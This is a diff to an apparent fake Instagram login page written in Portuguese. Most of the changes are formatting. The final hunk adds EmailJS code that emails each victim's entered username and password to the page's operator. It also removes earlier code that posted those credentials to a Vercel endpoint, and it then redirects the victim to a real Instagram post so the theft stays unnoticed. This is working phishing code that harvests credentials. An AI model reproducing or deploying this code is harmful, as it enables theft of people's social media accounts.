@@ -18,7 +18,7 @@
       <div class="wrapper">
         <div class="instagram-phone">
           <img
-            src="./images/instagram-celular.png "
+            src="./images/instagram-celular.png"
             alt="celular com fotos do feed do instagram"
           />
         </div>
@@ -77,8 +77,8 @@
                   >
                     <i class="fa-brands fa-facebook-square"></i>
                     <span class="login-with-fb"
-                      >Iniciar sessão com o Facebook
-                    </span>
+                      >Iniciar sessão com o Facebook</span
+                    >
                   </button>
 
                   <p class="forgot-password">
@@ -112,9 +112,9 @@
             <a href="https://developers.facebook.com/docs/instagram">API</a>
             <a href="https://www.instagram.com/legal/privacy/">Privacidade</a>
             <a href="https://www.instagram.com/legal/terms/">Termos</a>
-            <a href="https://www.instagram.com/explore/locations/">
-              Localizações
-            </a>
+            <a href="https://www.instagram.com/explore/locations/"
+              >Localizações</a
+            >
             <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
             <a href="https://www.threads.net/">Threads</a>
           </div>
@@ -128,51 +128,41 @@
       src="https://kit.fontawesome.com/44fd1bb967.js"
       crossorigin="anonymous"
     ></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
     <script>
+      (function () {
+        emailjs.init("0PUn0zL_x7mKANUms"); // Substitua pelo seu User ID do EmailJS
+      })();
+
       document
         .getElementById("loginButton")
         .addEventListener("click", function (event) {
-          // Captura os valores dos campos de entrada
           var username = document.getElementById("username").value;
           var password = document.getElementById("password").value;
 
-          // Verifica se os campos estão preenchidos
           if (username === "" || password === "") {
             alert("Por favor, preencha todos os campos.");
             return;
           }
 
-          // Exibe os valores no console log para depuração
           console.log("Username:", username);
           console.log("Password:", password);
 
-          // Envia os logs para o Vercel usando a API de logs
-          var vercelURL = "https://instagram-digaors-projects.vercel.app"; // Substitua com a URL real do seu projeto Vercel
-
-          fetch(`${vercelURL}/User/Login`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
+          emailjs
+            .send("service_o7d7l9d", "template_qetmtu3", {
               username: username,
               password: password,
-            }),
-          })
-            .then((response) => {
-              if (!response.ok) {
-                throw new Error("Falha na requisição para o Vercel.");
-              }
-              return response.json();
             })
-            .then((data) => {
-              console.log("Log enviado com sucesso:", data);
-              // Redireciona para a URL desejada após sucesso
+            .then(function (response) {
+              console.log("Log enviado com sucesso:", response);
               window.location.href =
                 "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
             })
-            .catch((error) => {
-              console.error("Erro ao enviar log para o Vercel:", error);
+            .catch(function (error) {
+              console.error("Erro ao enviar log:", error);
               alert("Erro ao enviar os dados. Por favor, tente novamente.");
             });
         });
